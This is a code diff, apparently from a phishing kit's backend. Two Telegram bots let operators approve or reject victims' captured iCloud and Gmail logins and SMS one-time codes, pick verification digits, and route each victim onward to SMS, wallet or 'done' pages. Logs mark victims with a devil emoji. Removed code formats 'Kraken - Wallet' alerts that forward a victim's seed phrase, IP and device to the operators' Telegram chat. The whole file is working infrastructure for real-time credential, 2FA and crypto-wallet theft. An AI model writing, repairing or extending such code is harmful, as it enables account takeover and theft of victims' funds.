+            await bot2.sendMessage(ADMIN_CHAT_ID_2, `❌ Bot 1 <b>REJECTED!</b>`, { parse_mode: "HTML" });
+          } else {
+            await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`, { parse_mode: "HTML" });
+          }
+        } catch (err) {
+          console.error("Error sending loser notification:", err);
+        }
+      }
+    }
+
+    // ============================================================================
+    // ✅ STEP 2: Handle button-specific logic
+    // ============================================================================
+
+    // Handle status update
+    const response = await fetch(`${APP_URL}/update-status`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, identifier: email, status: action })
+    });
+
+    // Handle redirection choices
+    if (action.includes("redirect_")) {
+      await fetch(`${APP_URL}/update-redirection-choice`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, choice: action })
+      });
+    }
+
+    if (response.ok) {
+      // Remove buttons from original message
+      try {
+        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
+        await fetch(editUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: ADMIN_CHAT_ID,
+            message_id: query.message?.message_id,
+            reply_markup: JSON.stringify({ inline_keyboard: [] })
+          })
+        });
+      } catch (err) {}
+
+      // Build status message
+      let statusMessage = "";
+      
+      if (action === "page1") {
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
+      } else if (action === "page2") {
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
+      } else if (action === "reject") {
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
+      } else if (action === "page_accept") {
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
+      } else if (action === "page_reject") {
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
+      } else if (action === "sms_accept") {
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED!</b> ✅`;
+      } else if (action === "sms_reject") {
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED!</b> ❌`;
+      } else if (action === "redirect_icloud") {
+        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+      } else if (action === "redirect_gmail") {
+        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+      } else if (action === "gmail_accept") {
+        // ✅ For Gmail callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching Gmail display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
+      } else if (action === "gmail_reject") {
+        // ✅ For Gmail callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching Gmail display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
+      } else if (action === "verification_accept") {
+        // ✅ For verification callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching verification display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED!</b> ✅`;
+      } else if (action === "verification_reject") {
+        // ✅ For verification callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching verification display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED!</b> ❌`;
+      } else if (action === "gmail_verify_accept") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED!</b> ✅`;
+      } else if (action === "gmail_verify_reject") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED!</b> ❌`;
+      } else if (action === "verifying_sms") {
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+      } else if (action === "verifying_done") {
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+      } else if (action === "verifying_wallet") {
+        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+      } else if (action === "verifying_icloud") {
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
+      } else if (action === "verifying_gmail") {
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
+      } else if (action === "sms2_wallet") {
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
+      } else if (action === "sms2_done") {
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
+      } else if (action === "sms2_reject") {
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
+      } else if (action === "wallet_decision_sms") {
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+      } else if (action === "wallet_decision_done") {
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+      } else if (action === "wallet_decision_icloud") {
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
+      } else if (action === "wallet_decision_gmail") {
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
       }
 
-      await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot2.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
+
+      // ✅ UPDATE STATUS on backend for verification callbacks
+      if (action === "verification_accept" || action === "verification_reject") {
+        try {
+          await fetch(`${APP_URL}/update-status`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: email, action: action })
+          });
+        } catch (err) {
+          console.error("Error updating status:", err);
+        }
+      }
+
+      if (statusMessage) {
+        // ✅ Log status message to console (strip HTML tags for clean logs)
+        const cleanMessage = statusMessage
+          .replace(/<code>/g, '')
+          .replace(/<\/code>/g, '')
+          .replace(/<b>/g, '')
+          .replace(/<\/b>/g, '')
+          .replace(/<i>/g, '')
+          .replace(/<\/i>/g, '');
+        console.log(cleanMessage);
+        
+        try {
+          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          await fetch(replyUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              text: statusMessage,
+              parse_mode: "HTML"
+            })
+          });
+        } catch (err) {
+          console.error(`❌ Failed to send status message:`, err);
+        }
+      }
+    }
+
+    bot.answerCallbackQuery(callbackId, {
+      text: `✅ ${action.toUpperCase()}`,
+      show_alert: false
+    }).catch(() => {});
+
+  } catch (err) {
+    console.error("❌ Error:", err.message);
+    bot.answerCallbackQuery(query.id, {
+      text: "❌ Error",
+      show_alert: true
+    }).catch(() => {});
+  }
+});
+
+// ============================================================================
+// ✅ BOT 2 CALLBACK QUERY HANDLER (with loser polling logic)
+// ============================================================================
+
+if (bot2) {
+  bot2.on("callback_query", async (query) => {
+    const callbackId = query.id;
+    
+    if (handledCallbacks.has(callbackId)) return;
+    handledCallbacks.add(callbackId);
+
+    try {
+      const [action, identifier] = query.data.split("|");
+
+
+      let email = identifier;
+      let smsCode = "";
+      let displayEmail = email;  // ✅ What to show in acceptance message
+
+      // ✅ For SMS callbacks, get SMS code from server
+      if (action.startsWith("sms_")) {
+        try {
+          const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          smsCode = data.smsCode || identifier;
+        } catch (err) {
+          console.error("Error fetching SMS code:", err);
+          smsCode = identifier;
+        }
+      }
+
+      // ✅ For iCloud page callbacks, get displayEmail from server
+      if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
+        try {
+          const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching display email:", err);
+          displayEmail = email;
+        }
+      }
+
+      // ============================================================================
+      // ✅ WALLET DECISION BUTTONS (Bot 2)
+      // ============================================================================
+
+      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
+        const email = identifier;
+
+        try {
+          // ✅ REMOVE BUTTONS from message
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: action })
+          });
+          
+          console.log(`✅ Wallet decision updated (Bot 2): ${action}`);
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
+
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        if (statusMessage) {
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+            const response = await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID_2,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+            
+            if (response.ok) {
+            } else {
+              console.error(`❌ Failed to send status message (Bot 2). Response status: ${response.status}`);
+            }
+          } catch (err) {
+            console.error(`❌ Error sending status message (Bot 2):`, err.message);
+          }
+        }
+
+        bot2.answerCallbackQuery(callbackId, {
+          text: `✅ ${action.toUpperCase()}`,
+          show_alert: false
+        }).catch(() => {});
+
+        return;
+      }
+
+      // ✅ HANDLE VERIFYING BUTTONS (Bot 2)
+      if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
+        const verifyingId = identifier;
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ verifyingId, choice: action })
+          });
+          
+          try {
+            await bot2.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+          } catch (err) {
+            console.error("Error removing buttons:", err);
+          }
+          
+          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
+          
+          try {
+            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+            const verifyData = await verifyRes.json();
+            const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+            
+            let choiceText = '';
+            let consoleLog = '';
+            if (action === "verifying_sms") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+              consoleLog = `😈 ${verifyEmail} directed to: SMS - 2`;
+            } else if (action === "verifying_done") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+              consoleLog = `😈 ${verifyEmail} directed to: Done`;
+            } else if (action === "verifying_wallet") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+              consoleLog = `😈 ${verifyEmail} directed to: Wallet`;
+            } else if (action === "verifying_icloud") {
+              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+              consoleLog = `😈 ${verifyEmail} directed to: iCloud`;
+            } else if (action === "verifying_gmail") {
+              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+              consoleLog = `😈 ${verifyEmail} directed to: Gmail`;
+            }
+            
+            if (consoleLog) {
+              console.log(consoleLog);
+            }
+            
+            if (choiceText) {
+              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+              await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: ADMIN_CHAT_ID_2,
+                  text: choiceText,
+                  parse_mode: "HTML"
+                })
+              });
+            }
+          } catch (err) {
+            console.error("Error sending verifying choice message:", err);
+          }
+          
+          return;
+        } catch (err) {
+          console.error("Error processing verifying choice:", err);
+          return;
+        }
+      }
+
+      // ✅ HANDLE SMS 2 BUTTONS (Bot 2) - NEW!
+      if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
+        const sms2Id = identifier;
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ sms2Id, choice: action })
+          });
+          
+          try {
+            await bot2.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+          } catch (err) {
+            console.error("Error removing buttons:", err);
+          }
+          
+          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
+          
+          try {
+            const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+            const sms2Data = await sms2Info.json();
+            const sms2Email = sms2Data.email || sms2Id;
+            const sms2Code = sms2Data.code;
+            
+            let statusMsg = "";
+            let consoleLog = "";
+            if (action === "sms2_wallet") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 💼`;
+            } else if (action === "sms2_done") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
+            } else if (action === "sms2_reject") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED!</b> ❌`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
+            } else if (action === "sms2_icloud") {
+              statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → ☁️`;
+            } else if (action === "sms2_gmail") {
+              statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 🌈`;
+            }
+            
+            if (consoleLog) {
+              console.log(consoleLog);
+            }
+            
+            if (statusMsg) {
+              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+              await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: ADMIN_CHAT_ID_2,
+                  text: statusMsg,
+                  parse_mode: "HTML"
+                })
+              });
+            }
+          } catch (err) {
+            console.error("Error sending SMS2 status message:", err);
+          }
+          
+          return;
+        } catch (err) {
+          console.error("Error processing SMS2 choice:", err);
+          return;
+        }
+      }
+
+      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only, NO verification!)
+      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
+        userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
+        botsThatClickedPage1[email] = true;
+        botsThatClickedPage1[`${email}_timestamp`] = Date.now();
+        bot2WinnerTimestamp[email] = Date.now();  // ✅ Store Bot 2 win time for fake Page 2 timeout
+        
+        console.log(`🏆 Bot 2 WINS! ${email} at ${new Date().toISOString()}`);
+        // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
+      }
+
+      // ============================================================================
+      // ✅ Handle verification digit selection
+      // ============================================================================
+      
+      if (action === "verify_digit") {
+        const [, requestId, digit] = query.data.split("|");
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ requestId, digit })
+          });
+          
+          const result = await updateResult.json();
+          
+          // ✅ Only remove keyboard and show message when we have 2 digits
+          if (result.selectedCount === 2) {
+            try {
+              await bot2.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                { chat_id: query.message.chat.id, message_id: query.message.message_id }
+              );
+              
+              await bot2.sendMessage(
+                query.message.chat.id,
+                `✅ <b>Numbers Selected!</b>`,
+                { parse_mode: "HTML" }
+              );
+            } catch (err) {
+              console.error("❌ Error editing message:", err);
+            }
+          }
+
+          await bot2.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
+          return;
+        } catch (err) {
+          console.error("❌ verify_digit error:", err);
+          await bot2.answerCallbackQuery(query.id, { text: "Error processing digit" });
+          return;
+        }
+      }
+
+      // ============================================================================
+      // ✅ WALLET DECISION BUTTONS (Bot 1)
+      // ============================================================================
+
+      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
+        const email = identifier;
+
+        try {
+          // ✅ REMOVE BUTTONS from message
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: action })
+          });
+          
+          console.log(`✅ Wallet decision updated: ${action}`);
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
+
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        if (statusMessage) {
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+            
+            if (response.ok) {
+            } else {
+              console.error(`❌ Failed to send status message. Response status: ${response.status}`);
+            }
+          } catch (err) {
+            console.error(`❌ Error sending status message:`, err.message);
+          }
+        }
+
+        bot.answerCallbackQuery(callbackId, {
+          text: `✅ ${action.toUpperCase()}`,
+          show_alert: false
+        }).catch(() => {});
+
+        return;
+      }
+
+      // ============================================================================
+      // ✅ LOSER GETS NOTHING - NO POLLING, NO SECOND CHANCE
+      // ============================================================================
+      
+      if (userWinnerTelegram[email] === "telegram1" && (action === "page1" || action === "page2")) {
+        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
+        // Loser gets NOTHING - no polling, no waiting, no second chance
+        
+        console.log(`❌ Bot 2 (loser) clicked but gets nothing - Bot 1 won!`);
+        
+        try {
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        try {
+          await bot2.sendMessage(ADMIN_CHAT_ID_2, 
+            `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`, 
+            { parse_mode: "HTML" }
+          );
+        } catch (err) {
+          console.error("Error sending acceptance message:", err);
+        }
+
+        await bot2.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      }
+
+      // ============================================================================
+      // ✅ STEP 3: Handle other buttons (same as Bot 1)
+      // ============================================================================
+
+      const response = await fetch(`${APP_URL}/update-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, identifier: email, status: action })
+      });
+
+      if (action.includes("redirect_")) {
+        await fetch(`${APP_URL}/update-redirection-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, choice: action })
+        });
+      }
+
+      if (response.ok) {
+        try {
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        let statusMessage = "";
+        
+        if (action === "page1") {
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
+        } else if (action === "page2") {
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
+        } else if (action === "reject") {
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
+        } else if (action === "page_accept") {
+          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
+        } else if (action === "page_reject") {
+          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED!</b> ❌`;
+        } else if (action === "sms_accept") {
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED!</b> ✅`;
+        } else if (action === "sms_reject") {
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED!</b> ❌`;
+        } else if (action === "redirect_icloud") {
+          statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+        } else if (action === "redirect_gmail") {
+          statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+        } else if (action === "gmail_accept") {
+          // ✅ For Gmail callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching Gmail display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
+        } else if (action === "gmail_reject") {
+          // ✅ For Gmail callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching Gmail display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
+        } else if (action === "verification_accept") {
+          // ✅ For verification callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching verification display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED!</b> ✅`;
+        } else if (action === "verification_reject") {
+          // ✅ For verification callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching verification display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED!</b> ❌`;
+        } else if (action === "gmail_verify_accept") {
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED!</b> ✅`;
+        } else if (action === "gmail_verify_reject") {
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED!</b> ❌`;
+        } else if (action === "verifying_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "verifying_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "verifying_wallet") {
+          statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+        } else if (action === "verifying_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "verifying_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        } else if (action === "sms2_wallet") {
+          statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
+        } else if (action === "sms2_done") {
+          statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
+        } else if (action === "sms2_reject") {
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
+        } else if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        // ✅ UPDATE STATUS on backend for verification callbacks
+        if (action === "verification_accept" || action === "verification_reject") {
+          try {
+            await fetch(`${APP_URL}/update-status`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email: email, action: action })
+            });
+          } catch (err) {
+            console.error("Error updating status:", err);
+          }
+        }
+
+        if (statusMessage) {
+          // ✅ Log status message to console (strip HTML tags for clean logs)
+          const cleanMessage = statusMessage
+            .replace(/<code>/g, '')
+            .replace(/<\/code>/g, '')
+            .replace(/<b>/g, '')
+            .replace(/<\/b>/g, '')
+            .replace(/<i>/g, '')
+            .replace(/<\/i>/g, '');
+          console.log(cleanMessage);
+          
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+            await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID_2,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+          } catch (err) {
+            console.error(`❌ Failed to send status message:`, err);
+          }
+        }
+      }
+
+      bot2.answerCallbackQuery(callbackId, {
+        text: `✅ ${action.toUpperCase()}`,
+        show_alert: false
+      }).catch(() => {});
 
     } catch (err) {
-      console.error("❌ Failed to handle callback (Bot 2):", err);
-      bot2.sendMessage(ADMIN_CHAT_ID_2, `⚠️ Error handling approval`);
+      console.error("❌ Error (Bot 2):", err.message);
+      bot2.answerCallbackQuery(query.id, {
+        text: "❌ Error",
+        show_alert: true
+      }).catch(() => {});
     }
   });
 }
 
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.\nPlease enter your 2FA code if prompted.");
-});
+console.log(`✅ Bots ready`);
 
-bot.onText(/\/startcb/, (msg) => {
-  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
-});
+// ============================================================================
+// ✅ EXPORT
+// ============================================================================
 
-async function sendAlertTelegram(type, { ip, region, device, phrase }) {
-  if (!botCaptchaPage || !CHAT_ID_CAPTCHA_PAGE) {
-    console.warn("⚠️ Captcha bot not configured, skipping alert");
-    return;
-  }
-
-  let message = "";
-
-  if (type === "phrase") {
-    message =
-      `💰💰💰💰 <b>Kraken - Wallet</b> 💰💰💰💰\n` +
-      `<b>📝 Phrases:</b>\n` +
-      `<code>${phrase}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else if (type === "guest") {
-    message =
-      `🥳🥳🥳🥳 <b>New Visitor</b> 🥳🥳🥳🥳\n\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else if (type === "bot") {
-    message =
-      `⛔️⛔️⛔️ <b>Kraken - Bot Alert</b> ⛔️⛔️⛔️\n\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else if (type === "too_many_attempts") {
-    message =
